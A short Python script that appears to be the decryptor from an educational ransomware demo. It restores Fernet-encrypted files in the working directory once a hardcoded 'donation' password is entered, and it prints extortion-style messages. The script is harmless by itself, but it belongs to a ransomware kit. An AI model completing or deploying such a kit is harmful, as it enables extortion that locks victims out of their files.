#! /usr/bin/env python3

import os
from cryptography.fernet import Fernet

# find the files

files = []

# go through every file we can find in our current working directory
# we do not want to encrypt the ransomware file though!
# we also don't want to add directories
for file in os.listdir():
    if file == "ransomware.py" or file == "ransom_key.key" or file == "decrypt_ransomware.py":
        continue
    if file == ".git":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("ransom_key.key","rb") as key:
    secret_key = key.read()

pass_phrase = 'Thankyouforyourdonation'
user_phrase = input('Enter the password to decrypt your files\n')

if user_phrase == pass_phrase:
    for file in files:
        with open(file, "rb") as currFile:
            contents = currFile.read()
        contents_decrypted = Fernet(secret_key).decrypt(contents)
        with open(file, "wb") as currFile:
            currFile.write(contents_decrypted)
    print('Thank you for your kind donation. We hope that you have learned something about cybersecurity throughout this process!')
else:
    print('You shall never decrypt your files without a donation!')
